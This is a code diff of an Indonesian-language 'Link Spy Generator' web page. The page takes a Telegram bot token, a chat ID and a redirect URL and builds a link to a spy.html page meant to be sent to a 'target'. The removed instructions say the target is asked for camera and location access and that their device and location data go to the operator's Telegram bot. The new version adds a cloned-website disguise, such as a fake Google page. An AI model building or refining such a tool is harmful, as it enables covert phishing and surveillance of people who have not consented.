@@ -3,132 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Generate Link Spy</title>
+    <title>Link Generator</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Arial', sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
-            color: #333;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: white;
             min-height: 100vh;
             padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
         
         .container {
-            max-width: 800px;
-            margin: 0 auto;
-            background: white;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
             border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            overflow: hidden;
-        }
-        
-        .header {
-            background: linear-gradient(90deg, #2c3e50 0%, #4a6491 100%);
-            color: white;
-            padding: 25px;
-            text-align: center;
-        }
-        
-        .header h1 {
-            font-size: 28px;
-            margin-bottom: 10px;
-        }
-        
-        .header p {
-            opacity: 0.8;
-            font-size: 16px;
-        }
-        
-        .content {
             padding: 30px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+        
+        h1 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #4cc9f0;
         }
         
         .form-group {
-            margin-bottom: 25px;
+            margin-bottom: 20px;
         }
         
-        .form-group label {
+        label {
             display: block;
             margin-bottom: 8px;
-            font-weight: 600;
-            color: #2c3e50;
+            font-weight: bold;
         }
         
-        .form-control {
+        input {
             width: 100%;
-            padding: 12px 15px;
-            border: 2px solid #e0e0e0;
+            padding: 12px;
+            border: none;
             border-radius: 8px;
+            background: rgba(255, 255, 255, 0.9);
             font-size: 16px;
-            transition: all 0.3s;
-        }
-        
-        .form-control:focus {
-            border-color: #3498db;
-            outline: none;
-            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.2);
         }
         
         .btn {
-            background: linear-gradient(90deg, #3498db 0%, #2980b9 100%);
+            background: linear-gradient(90deg, #4361ee, #3a0ca3);
             color: white;
             border: none;
-            padding: 15px 30px;
+            padding: 15px;
             font-size: 18px;
-            font-weight: 600;
             border-radius: 8px;
             cursor: pointer;
-            transition: all 0.3s;
-            display: block;
             width: 100%;
-            margin: 25px 0;
+            margin: 10px 0;
+            transition: all 0.3s;
         }
         
         .btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(52, 152, 219, 0.4);
-        }
-        
-        .btn:active {
-            transform: translateY(0);
-        }
-        
-        .btn-secondary {
-            background: linear-gradient(90deg, #95a5a6 0%, #7f8c8d 100%);
-        }
-        
-        .btn-secondary:hover {
-            box-shadow: 0 5px 15px rgba(149, 165, 166, 0.4);
+            box-shadow: 0 5px 15px rgba(67, 97, 238, 0.4);
         }
         
         .result {
-            margin-top: 25px;
-            padding: 20px;
-            background: #f8f9fa;
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.1);
             border-radius: 8px;
-            border-left: 4px solid #3498db;
             display: none;
         }
         
-        .result h3 {
-            margin-bottom: 15px;
-            color: #2c3e50;
-        }
-        
         .generated-link {
-            background: white;
-            padding: 15px;
-            border-radius: 6px;
-            border: 1px solid #e0e0e0;
             word-break: break-all;
-            font-family: monospace;
-            margin-bottom: 15px;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
         }
         
         .copy-btn {
@@ -136,221 +96,106 @@
             color: white;
             border: none;
             padding: 10px 15px;
-            border-radius: 6px;
+            border-radius: 5px;
             cursor: pointer;
-            font-size: 14px;
-            transition: background 0.3s;
+            margin-top: 10px;
         }
         
-        .copy-btn:hover {
-            background: #219653;
-        }
-        
-        .instructions {
-            margin-top: 30px;
-            padding: 20px;
-            background: #e8f4fc;
-            border-radius: 8px;
-            border-left: 4px solid #3498db;
-        }
-        
-        .instructions h3 {
-            margin-bottom: 15px;
-            color: #2c3e50;
-        }
-        
-        .instructions ol {
-            padding-left: 20px;
-        }
-        
-        .instructions li {
-            margin-bottom: 10px;
-            line-height: 1.5;
-        }
-        
-        .footer {
-            text-align: center;
-            padding: 20px;
-            color: #7f8c8d;
-            font-size: 14px;
-            border-top: 1px solid #e0e0e0;
-        }
-        
-        .divider {
-            height: 1px;
-            background: linear-gradient(90deg, transparent 0%, #e0e0e0 50%, transparent 100%);
-            margin: 30px 0;
-        }
-        
-        .status {
-            padding: 15px;
-            border-radius: 8px;
-            margin: 15px 0;
-            display: none;
-        }
-        
-        .success {
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-        }
-        
-        .error {
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
+        .preview {
+            margin-top: 15px;
+            padding: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 5px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <h1>Generate Link Spy</h1>
-            <p>Buat link untuk mengumpulkan informasi perangkat dan lokasi</p>
+        <h1>🔗 Link Spy Generator</h1>
+        
+        <div class="form-group">
+            <label>Bot Token:</label>
+            <input type="text" id="botToken" placeholder="Masukkan token bot Telegram">
         </div>
         
-        <div class="content">
-            <div class="form-group">
-                <label for="botToken">Bot Token</label>
-                <input type="text" id="botToken" class="form-control" placeholder="Masukkan token bot Telegram">
-            </div>
-            
-            <div class="form-group">
-                <label for="chatId">Chat ID</label>
-                <input type="text" id="chatId" class="form-control" placeholder="Masukkan Chat ID">
-            </div>
-            
-            <div class="form-group">
-                <label for="urlTarget">URL Target</label>
-                <input type="text" id="urlTarget" class="form-control" placeholder="Masukkan URL tujuan setelah data terkirim">
-            </div>
-            
-            <div class="divider"></div>
-            
-            <button id="generateBtn" class="btn">Generate Link</button>
-            
-            <div class="result" id="result">
-                <h3>Link Berhasil Dibuat:</h3>
-                <div class="generated-link" id="generatedLink"></div>
-                <button class="copy-btn" id="copyBtn">Salin Link</button>
-                
-                <div class="instructions">
-                    <h3>Cara Menggunakan:</h3>
-                    <ol>
-                        <li>Salin link di atas dan kirimkan ke target</li>
-                        <li>Saat target membuka link, mereka akan diminta izin kamera dan lokasi</li>
-                        <li>Setelah diizinkan, informasi perangkat dan lokasi akan dikirim ke bot Telegram Anda</li>
-                        <li>Target akan diarahkan ke URL tujuan yang telah ditentukan</li>
-                    </ol>
-                </div>
-            </div>
-            
-            <div class="status" id="status"></div>
-            
-            <button id="keluarBtn" class="btn btn-secondary">Keluar</button>
+        <div class="form-group">
+            <label>Chat ID:</label>
+            <input type="text" id="chatId" placeholder="Masukkan Chat ID">
         </div>
         
-        <div class="footer">
-            <p>Tool Generate Link Spy &copy; 2025</p>
+        <div class="form-group">
+            <label>URL Target (Website Asli):</label>
+            <input type="text" id="targetUrl" placeholder="Contoh: https://google.com" value="https://google.com">
         </div>
+        
+        <div class="form-group">
+            <label>Nama Website (Untuk Clone):</label>
+            <input type="text" id="siteName" placeholder="Contoh: Google" value="Google">
+        </div>
+        
+        <button class="btn" id="generateBtn">Generate Link Spy</button>
+        
+        <div class="result" id="result">
+            <h3>Link Spy Berhasil Dibuat:</h3>
+            <div class="generated-link" id="generatedLink"></div>
+            
+            <div class="preview">
+                <strong>Preview:</strong><br>
+                Target akan melihat clone website <span id="previewSiteName">Google</span><br>
+                Lalu redirect ke: <span id="previewTargetUrl">https://google.com</span>
+            </div>
+            
+            <button class="copy-btn" id="copyBtn">Salin Link Spy</button>
+        </div>
+        
+        <button class="btn" style="background: #6c757d;" id="keluarBtn">Keluar</button>
     </div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const botTokenInput = document.getElementById('botToken');
-            const chatIdInput = document.getElementById('chatId');
-            const urlTargetInput = document.getElementById('urlTarget');
-            const generateBtn = document.getElementById('generateBtn');
-            const resultDiv = document.getElementById('result');
-            const generatedLinkDiv = document.getElementById('generatedLink');
-            const copyBtn = document.getElementById('copyBtn');
-            const keluarBtn = document.getElementById('keluarBtn');
-            const statusDiv = document.getElementById('status');
+        document.getElementById('generateBtn').addEventListener('click', function() {
+            const botToken = document.getElementById('botToken').value;
+            const chatId = document.getElementById('chatId').value;
+            const targetUrl = document.getElementById('targetUrl').value;
+            const siteName = document.getElementById('siteName').value;
             
-            // Fungsi untuk menampilkan status
-            function showStatus(message, type) {
-                statusDiv.textContent = message;
-                statusDiv.className = `status ${type}`;
-                statusDiv.style.display = 'block';
-                
-                setTimeout(() => {
-                    statusDiv.style.display = 'none';
-                }, 5000);
+            if (!botToken || !chatId || !targetUrl) {
+                alert('Isi semua field terlebih dahulu!');
+                return;
             }
             
-            // Fungsi untuk menghasilkan link
-            function generateSpyLink() {
-                const botToken = botTokenInput.value.trim();
-                const chatId = chatIdInput.value.trim();
-                const urlTarget = urlTargetInput.value.trim();
-                
-                if (!botToken) {
-                    showStatus("Masukkan Bot Token terlebih dahulu", "error");
-                    return;
-                }
-                
-                if (!chatId) {
-                    showStatus("Masukkan Chat ID terlebih dahulu", "error");
-                    return;
-                }
-                
-                if (!urlTarget) {
-                    showStatus("Masukkan URL Target terlebih dahulu", "error");
-                    return;
-                }
-                
-                // Encode data untuk disimpan di URL
-                const data = {
-                    token: botToken,
-                    chatId: chatId,
-                    target: urlTarget
-                };
-                
-                const encodedData = btoa(JSON.stringify(data));
-                
-                // Buat URL spy page
-                const currentUrl = window.location.href.split('?')[0];
-                const spyPageUrl = currentUrl.replace('index.html', 'spy.html') || currentUrl + 'spy.html';
-                const finalUrl = `${spyPageUrl}?data=${encodedData}`;
-                
-                // Tampilkan hasil
-                generatedLinkDiv.textContent = finalUrl;
-                resultDiv.style.display = 'block';
-                
-                showStatus("Link berhasil dibuat!", "success");
-            }
+            // Encode data
+            const data = {
+                token: botToken,
+                chatId: chatId,
+                target: targetUrl,
+                siteName: siteName
+            };
             
-            // Fungsi untuk menyalin link
-            function copyLink() {
-                const linkText = generatedLinkDiv.textContent;
-                
-                navigator.clipboard.writeText(linkText)
-                    .then(() => {
-                        showStatus("Link berhasil disalin!", "success");
-                    })
-                    .catch(err => {
-                        showStatus("Gagal menyalin link: " + err, "error");
-                    });
-            }
+            const encodedData = btoa(JSON.stringify(data));
             
-            // Event listeners
-            generateBtn.addEventListener('click', generateSpyLink);
-            copyBtn.addEventListener('click', copyLink);
-            keluarBtn.addEventListener('click', function() {
-                if (confirm("Apakah Anda yakin ingin keluar?")) {
-                    window.close();
-                }
+            // Generate link spy
+            const currentUrl = window.location.href;
+            const baseUrl = currentUrl.substring(0, currentUrl.lastIndexOf('/') + 1);
+            const spyUrl = baseUrl + 'spy.html?data=' + encodedData;
+            
+            // Tampilkan hasil
+            document.getElementById('generatedLink').textContent = spyUrl;
+            document.getElementById('previewSiteName').textContent = siteName;
+            document.getElementById('previewTargetUrl').textContent = targetUrl;
+            document.getElementById('result').style.display = 'block';
+        });
+        
+        document.getElementById('copyBtn').addEventListener('click', function() {
+            const linkText = document.getElementById('generatedLink').textContent;
+            navigator.clipboard.writeText(linkText).then(() => {
+                alert('Link spy berhasil disalin!');
             });
-            
-            // Cek apakah ada parameter di URL untuk auto-fill
-            const urlParams = new URLSearchParams(window.location.search);
-            const tokenParam = urlParams.get('token');
-            const chatIdParam = urlParams.get('chatid');
-            const targetParam = urlParams.get('target');
-            
-            if (tokenParam) botTokenInput.value = tokenParam;
-            if (chatIdParam) chatIdInput.value = chatIdParam;
-            if (targetParam) urlTargetInput.value = targetParam;
+        });
+        
+        document.getElementById('keluarBtn').addEventListener('click', function() {
+            if (confirm('Yakin ingin keluar?')) {
+                window.close();
+            }
         });
     </script>
 </body>
